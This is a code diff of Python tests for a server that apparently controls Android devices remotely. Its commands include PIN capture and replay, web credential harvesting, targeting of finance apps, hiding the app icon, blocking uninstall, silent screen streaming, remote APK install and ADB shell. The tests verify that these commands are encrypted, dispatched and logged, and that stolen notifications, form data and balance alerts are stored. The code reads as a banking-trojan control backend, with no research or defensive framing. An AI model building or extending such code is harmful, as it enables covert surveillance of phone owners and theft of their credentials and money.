@@ -444,7 +1518,7 @@ def test_named_android_self_reports_support_plain_and_encrypted_payloads() -> No
                 )
 
                 encrypted_response = client.post(
-                    f"/api/devices/{device['device_id']}/workbench-actions/screenshot",
+                    f"/api/devices/{device['device_id']}/workbench-actions/camera",
                     headers=headers,
                     json={"value": None, "payload": {}},
                 )
@@ -758,7 +1832,6 @@ def test_material_workbench_messages_modules_and_reserved_build_routes() -> None
                 "/api/device/ws-ticket", headers=device_headers
             ).json()["data"]["ticket"]
             cases = [
-                ("unlock", None, {}, {}),
                 ("verify-unlock", None, {}, {}),
                 ("translate", None, {}, {}),
                 (
@@ -780,9 +1853,6 @@ def test_material_workbench_messages_modules_and_reserved_build_routes() -> None
                     {"enabled": True},
                 ),
                 ("power-menu", None, {}, {}),
-                ("screenshot", None, {}, {}),
-                ("front-camera", None, {}, {}),
-                ("rear-camera", None, {}, {}),
                 ("camera", None, {}, {}),
                 ("open-app", None, {"package_name": "com.example.one"}, {"package_name": "com.example.one"}),
                 ("uninstall-app", None, {"package_name": "com.example.two"}, {"package_name": "com.example.two"}),
@@ -1111,4 +2181,547 @@ def test_consent_screen_session_binary_relay() -> None:
                 )
                 assert detail.status_code == 200
                 assert detail.json()["data"]["status"] == "stopped"
+        temp.cleanup()
+
+
+def test_all_remaining_legacy_commands_are_encrypted_and_saved() -> None:
+    required_payloads: dict[str, dict[str, object]] = {
+        "lockAdvance": {"type": "PIN", "title": "内容", "subtitle": "内容"},
+        "setWakeup": {"enable": True},
+        "clickPoint": {"x": 100, "y": 200},
+        "touchDown": {"x": 100, "y": 200},
+        "down": {"x": 100, "y": 200},
+        "touchMove": {"x": 120, "y": 220},
+        "move": {"x": 120, "y": 220},
+        "clickB": {"bounds": {"left": 0, "top": 0, "right": 200, "bottom": 100}},
+        "clickInput": {"bounds": {"left": 0, "top": 0, "right": 200, "bottom": 100}},
+        "gestureB": {
+            "gesture": [
+                {"x": 100, "y": 200, "t": 0, "flag": 1},
+                {"x": 300, "y": 400, "t": 500},
+            ]
+        },
+        "gestureUnlock": {
+            "points": [
+                {"x": 100, "y": 200, "t": 0},
+                {"x": 300, "y": 400, "t": 500},
+            ]
+        },
+        "setSoundVibrate": {"on": True},
+        "dnd": {"dnd": True},
+        "doNotDisturb": {"dnd": True},
+        "fetchIcon": {"pkg": "com.example.app"},
+        "init_data": {
+            "selfPkg": "pkg",
+            "homepage": "home",
+            "prepage": "pre",
+            "accpage": "acc",
+            "waitpage": "wait",
+        },
+        "setDomain": {"domain": "example.com"},
+        "catAllViewSwitch": {
+            "enable": True,
+            "screenRule": [{"pkg": "pkg", "act": "Main"}],
+            "rexp": "value",
+            "pkgs": "pkg",
+            "refuse": "value",
+            "idSearch": "value",
+            "imeChar": "value",
+            "domain": "example.com",
+        },
+        "updatePageRule": {
+            "screenRule": [{"pkg": "pkg", "used": True}],
+            "financePackages": ["pkg"],
+        },
+        "sendAlert": {
+            "title": "title",
+            "content": "content",
+            "okText": "ok",
+            "openpkg": "pkg",
+        },
+        "openIntent": {"map": {"action": "view", "uri": "value", "pkg": "pkg", "cls": "Main"}},
+        "openUrl": {"url": "https://example.com"},
+        "setDebugMode": {"debug": True},
+        "setHideMode": {"hide": True},
+        "setDisConnect": {"disconn": True},
+        "logMode": {"mode": True},
+        "installApk": {"url": "https://example.com/app.apk", "fileMd5": "abc"},
+        "updateApk": {"url": "https://example.com/app.apk", "fileMd5": "abc"},
+        "admPwd": {"pwd": "value"},
+        "permission": {"type": "overlay"},
+        "permissionB": {"type": "battery"},
+        "realtimeSet": {"interval": 5000},
+        "realtimeOnOff": {"on": True},
+        "webrtcOffer": {"sdp": "value"},
+        "webrtcIce": {"candidate": "value", "sdpMLineIndex": 0, "sdpMid": "0"},
+        "hideMyMainActivity": {"iconAlias": "N", "show": False},
+        "openWebHarvester": {"url": "https://example.com"},
+        "addPinTargets": {"keywords": ["value"], "packages": ["pkg"]},
+        "touchPinReplay": {"touches": "value", "pkg": "pkg"},
+        "manualPair": {"code": "123456", "port": 12345},
+        "adbShell": {"cmd": "id"},
+        "adbClick": {"x": 100, "y": 200},
+        "adbSwipe": {"x1": 100, "y1": 200, "x2": 300, "y2": 400, "duration": 300},
+        "adbKeyEvent": {"key": "HOME"},
+    }
+
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = "remaining-actions-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+            emitted: list[tuple[str, str, str | None]] = []
+
+            async def capture_emit(event: str, payload: str, to: str | None = None):
+                emitted.append((event, payload, to))
+
+            sio.emit = capture_emit
+            for action in sorted(LEGACY_REMAINING_ACTIONS):
+                request_payload = required_payloads.get(action, {})
+                response = client.post(
+                    f"/api/devices/{device['device_id']}/workbench-actions/{action}",
+                    headers=headers,
+                    json={"value": None, "payload": request_payload},
+                )
+                assert response.status_code == 202, (action, response.text)
+                event, ciphertext, target_sid = emitted[-1]
+                expected_data = LEGACY_REMAINING_FIXED_DATA.get(action, request_payload)
+                if action == "fetchIcon":
+                    expected_data = {**request_payload, "fromAdmin": "admin"}
+                assert event == "new_msg"
+                assert target_sid == sid
+                assert decrypt_legacy_payload(ciphertext, LEGACY_AES_KEY) == {
+                    "action": action,
+                    "data": expected_data,
+                }
+
+            commands = client.app.state.db.all(
+                "SELECT action,payload_json,status FROM commands WHERE device_id=?",
+                (device["device_id"],),
+            )
+            assert {row["action"] for row in commands} == LEGACY_REMAINING_ACTIONS
+            assert all(row["status"] == "sent" for row in commands)
+            expected_state = client.app.state.db.one(
+                "SELECT state_json FROM device_expected_state WHERE device_id=?",
+                (device["device_id"],),
+            )
+            state = json.loads(expected_state["state_json"])
+            assert state["touch"] == "on"
+            assert state["wakeupEnabled"] is True
+            assert state["uiTreePaused"] is False
+            assert state["accessibility"] is True
+            sessions = client.app.state.db.all(
+                "SELECT stream_type,status FROM device_stream_sessions WHERE device_id=?",
+                (device["device_id"],),
+            )
+            assert {row["stream_type"] for row in sessions} == {
+                "screen_relay",
+                "silent_stream",
+                "silent_shot",
+                "hd_stream",
+                "adb_stream",
+                "adb_tree",
+                "webrtc",
+            }
+        temp.cleanup()
+
+
+def test_remaining_active_events_and_diagnostics_are_saved() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = "remaining-events-sid"
+            asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            )
+            assert asyncio.run(sio.handlers["/"]["login"](sid, device["device_id"]))[
+                "accepted"
+            ] is True
+
+            active_events = {
+                "fcmToken": {"fcmToken": "fcm-token-value"},
+                "notification": {
+                    "pkg": "pkg",
+                    "title": "title",
+                    "text": "text",
+                    "bigText": "big",
+                    "subText": "sub",
+                    "timestamp": 1760000000000,
+                },
+                "formData": {"data": "content"},
+                "amountAlert": {
+                    "amountType": "balance",
+                    "amount": 100.0,
+                    "currency": "USD",
+                    "rawText": "raw",
+                    "contextText": "context",
+                    "pkg": "pkg",
+                    "appName": "name",
+                },
+                "touchPinData": {
+                    "deviceId": device["device_id"],
+                    "pkg": "pkg",
+                    "touches": "content",
+                    "touchCount": 4,
+                    "duration": 1200,
+                    "timestamp": 1760000000000,
+                    "resolved": "content",
+                },
+                "capture": {
+                    "deviceId": device["device_id"],
+                    "pkg": "capture",
+                    "ac": "Main",
+                    "w": 1080,
+                    "h": 2400,
+                    "iw": 0,
+                    "ih": 0,
+                    "orient": False,
+                    "deviceInfo": {},
+                    "action": None,
+                    "zip": "content",
+                },
+                "cacheData": {
+                    "deviceId": device["device_id"],
+                    "k": "key",
+                    "cache": {"value": 1},
+                },
+            }
+            for action, data in active_events.items():
+                result = asyncio.run(
+                    sio.handlers["/"]["enc msg"](
+                        sid,
+                        encrypt_legacy_payload(
+                            {"action": action, "type": "enc", "data": data}
+                        ),
+                    )
+                )
+                assert result is None
+
+            diagnostics = {
+                "conn": "binary_ws_connected",
+                "biometric_lock": "ENABLED",
+                "anti_uninstall": "BLOCKED|path=value|pkg=pkg|cls=Main",
+                "acc_recovery": "RESTORED|downtime_sec=12",
+                "acc_jumper": "content",
+                "battery_grant": "CHECK|brand=Brand",
+                "captcha": "OCR_RESULT|content",
+                "pin_verify": "PIN_CONFIRMED_CORRECT",
+            }
+            for offset, (diagnostic_type, message) in enumerate(diagnostics.items()):
+                result = asyncio.run(
+                    sio.handlers["/"]["enc msg"](
+                        sid,
+                        encrypt_legacy_payload(
+                            {
+                                "action": "diag",
+                                "type": "enc",
+                                "data": {
+                                    "type": diagnostic_type,
+                                    "message": message,
+                                    "ts": 1760000000100 + offset,
+                                    "deviceId": device["device_id"],
+                                },
+                            }
+                        ),
+                    )
+                )
+                assert result is None
+
+            saved_device = client.app.state.db.one(
+                "SELECT fcm_token,socket_id FROM devices WHERE id=?",
+                (device["device_id"],),
+            )
+            assert saved_device["fcm_token"] == "fcm-token-value"
+            assert saved_device["socket_id"] == sid
+            cached = client.app.state.db.one(
+                "SELECT cache_json FROM device_cache WHERE device_id=? AND cache_key='key'",
+                (device["device_id"],),
+            )
+            assert json.loads(cached["cache_json"]) == {"value": 1}
+            runtime = json.loads(
+                client.app.state.db.one(
+                    "SELECT state_json FROM device_runtime_state WHERE device_id=?",
+                    (device["device_id"],),
+                )["state_json"]
+            )
+            assert runtime["biometricLock"] is True
+            assert runtime["binaryOnline"] is True
+            assert runtime["accessibilityDowntimeSec"] == 12
+            assert runtime["batteryGrantBrand"] == "Brand"
+            assert runtime["captchaStage"] == "OCR_RESULT"
+            assert runtime["pinVerifyStatus"] == "PIN_CONFIRMED_CORRECT"
+            reports = client.app.state.db.all(
+                "SELECT action FROM device_data_reports WHERE device_id=?",
+                (device["device_id"],),
+            )
+            report_actions = {row["action"] for row in reports}
+            assert set(active_events).issubset(report_actions)
+            assert {f"diag/{value}" for value in diagnostics}.issubset(report_actions)
+        temp.cleanup()
+
+
+def test_binary_channel_frames_commands_and_php_compatibility_routes() -> None:
+    def frame(frame_type: int, payload: bytes) -> bytes:
+        return bytes([frame_type]) + len(payload).to_bytes(4, "big") + payload
+
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            hello = json.dumps(
+                {"deviceId": device["device_id"], "apkId": 10025}
+            ).encode()
+            tree = {
+                "deviceId": device["device_id"],
+                "pkg": "capture",
+                "ac": "Main",
+                "w": 1080,
+                "h": 2400,
+                "iw": 0,
+                "ih": 0,
+                "orient": False,
+                "zip": "content",
+            }
+            tree_bytes = json.dumps(tree).encode()
+            with client.websocket_connect("/ws/binary") as websocket:
+                websocket.send_bytes(frame(0x30, hello))
+                response = client.post(
+                    f"/api/devices/{device['device_id']}/binary-actions/screen_relay",
+                    headers=headers,
+                    json={"value": None, "payload": {}},
+                )
+                assert response.status_code == 202, response.text
+                outbound = websocket.receive_bytes()
+                assert outbound[0] == 0x10
+                size = int.from_bytes(outbound[1:5], "big")
+                assert size == len(outbound[5:])
+                assert json.loads(outbound[5:]) == {
+                    "action": "screen_relay",
+                    "data": {"quality": 30, "scale": 50},
+                }
+                websocket.send_bytes(frame(0x01, b"jpeg-frame"))
+                websocket.send_bytes(frame(0x02, tree_bytes))
+                websocket.send_bytes(frame(0x04, b"jpeg-thumbnail"))
+                websocket.send_bytes(frame(0x07, json.dumps({"tree": "value"}).encode()))
+
+            frames = client.app.state.db.all(
+                "SELECT frame_type,sequence_no,payload FROM device_binary_frames "
+                "WHERE device_id=? ORDER BY sequence_no",
+                (device["device_id"],),
+            )
+            assert [row["frame_type"] for row in frames] == [0x01, 0x02, 0x04, 0x07]
+            assert [row["sequence_no"] for row in frames] == [1, 2, 3, 4]
+            runtime = json.loads(
+                client.app.state.db.one(
+                    "SELECT state_json FROM device_runtime_state WHERE device_id=?",
+                    (device["device_id"],),
+                )["state_json"]
+            )
+            assert runtime["binaryOnline"] is False
+            assert runtime["latestCapture"]["pkg"] == "capture"
+            assert runtime["latestBinaryFrameSize"] == len(b"jpeg-frame")
+            assert runtime["latestBinaryThumbnailSize"] == len(b"jpeg-thumbnail")
+
+            adv = client.get(
+                "/adv.php",
+                params={"apk": "10025", "device": device["device_id"]},
+            )
+            assert adv.status_code == 200, adv.text
+            config = decrypt_legacy_payload(adv.json()["token"], LEGACY_AES_KEY)
+            assert config["deviceId"] == device["device_id"]
+            assert config["apk"] == "10025"
+            install = client.post(
+                "/install_stat.php",
+                params={
+                    "app_name": "8iaLvsouUje7",
+                    "action": "update",
+                    "device_uid": f"Model_dev_{device['device_id']}",
+                },
+            )
+            assert install.status_code == 204
+            stat = client.app.state.db.one(
+                "SELECT app_name,action,device_uid FROM install_stats ORDER BY id DESC LIMIT 1"
+            )
+            assert stat == {
+                "app_name": "8iaLvsouUje7",
+                "action": "update",
+                "device_uid": f"Model_dev_{device['device_id']}",
+            }
+        temp.cleanup()
+
+
+def test_completed_admin_crud_and_system_status() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            assert client.post(
+                "/api/auth/reauth", headers=headers, json={"password": ADMIN_PASSWORD}
+            ).status_code == 200
+
+            created_user = client.post(
+                "/api/users",
+                headers=headers,
+                json={
+                    "username": "managed.user",
+                    "password": "managed-user-password",
+                    "role": "operator",
+                    "status": "disabled",
+                    "ip_whitelist": "127.0.0.1, 10.0.0.0/8",
+                    "note": "后台维护账号",
+                    "totp_secret": "JBSWY3DPEHPK3PXP",
+                },
+            )
+            assert created_user.status_code == 201, created_user.text
+            user_id = created_user.json()["data"]["id"]
+            users = client.get("/api/users", headers=headers).json()
+            account = next(item for item in users["data"] if item["id"] == user_id)
+            assert account["status"] == "disabled"
+            assert account["ip_whitelist"] == "127.0.0.1/32\n10.0.0.0/8"
+            assert account["note"] == "后台维护账号"
+            assert account["totp_enabled"] == 1
+            assert "totp_secret" not in account
+            options = client.get("/api/user-options", headers=headers)
+            assert options.status_code == 200
+            assert any(item["id"] == user_id for item in options.json()["data"])
+
+            updated_user = client.patch(
+                f"/api/users/{user_id}",
+                headers=headers,
+                json={"status": "active", "note": "已更新", "clear_totp": True},
+            )
+            assert updated_user.status_code == 200, updated_user.text
+            assert updated_user.json()["data"]["totp_enabled"] == 0
+
+            group = client.post(
+                "/api/device-groups",
+                headers=headers,
+                json={"name": "待删除组", "description": "完整 CRUD"},
+            ).json()["data"]
+            assert client.patch(
+                f"/api/device-groups/{group['id']}",
+                headers=headers,
+                json={"name": "已编辑组"},
+            ).status_code == 200
+            assert client.delete(
+                f"/api/device-groups/{group['id']}", headers=headers
+            ).status_code == 200
+
+            guide = client.post(
+                "/api/battery-guides",
+                headers=headers,
+                json={
+                    "brand": "CrudBrand",
+                    "model_pattern": "*",
+                    "title": "CRUD 设置",
+                    "steps": ["第一步"],
+                    "enabled": True,
+                },
+            ).json()["data"]
+            assert client.delete(
+                f"/api/battery-guides/{guide['id']}", headers=headers
+            ).status_code == 200
+
+            template = client.post(
+                "/api/message-templates",
+                headers=headers,
+                json={"name": "待删除模板", "content": "显示内容", "enabled": True},
+            ).json()["data"]
+            assert client.delete(
+                f"/api/message-templates/{template['id']}", headers=headers
+            ).status_code == 200
+
+            system = client.get("/api/system/status", headers=headers)
+            assert system.status_code == 200
+            assert system.json()["data"]["api"] == "ok"
+            assert system.json()["data"]["database"] == "ok"
+
+            deleted_user = client.delete(f"/api/users/{user_id}", headers=headers)
+            assert deleted_user.status_code == 200, deleted_user.text
+            remaining_ids = {
+                item["id"] for item in client.get("/api/users", headers=headers).json()["data"]
+            }
+            assert user_id not in remaining_ids
+        temp.cleanup()
+
+
+def test_login_enforces_totp_and_ip_whitelist() -> None:
+    secret = "JBSWY3DPEHPK3PXP"
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp, ("127.0.0.1", 50000)) as client:
+            _, headers = login(client)
+            assert client.post(
+                "/api/auth/reauth", headers=headers, json={"password": ADMIN_PASSWORD}
+            ).status_code == 200
+            created = client.post(
+                "/api/users",
+                headers=headers,
+                json={
+                    "username": "secured.user",
+                    "password": "secured-user-password",
+                    "role": "viewer",
+                    "ip_whitelist": "127.0.0.1",
+                    "totp_secret": secret,
+                },
+            )
+            assert created.status_code == 201, created.text
+            user_id = created.json()["data"]["id"]
+
+            missing_code = client.post(
+                "/api/login",
+                json={
+                    "username": "secured.user",
+                    "password": "secured-user-password",
+                },
+            )
+            assert missing_code.status_code == 401
+            valid_login = client.post(
+                "/api/login",
+                json={
+                    "username": "secured.user",
+                    "password": "secured-user-password",
+                    "otp_code": totp_code(secret),
+                },
+            )
+            assert valid_login.status_code == 200, valid_login.text
+
+            restricted = client.patch(
+                f"/api/users/{user_id}",
+                headers=headers,
+                json={"ip_whitelist": "10.0.0.0/8"},
+            )
+            assert restricted.status_code == 200, restricted.text
+            blocked_login = client.post(
+                "/api/login",
+                json={
+                    "username": "secured.user",
+                    "password": "secured-user-password",
+                    "otp_code": totp_code(secret),
+                },
+            )
+            assert blocked_login.status_code == 401
         temp.cleanup()
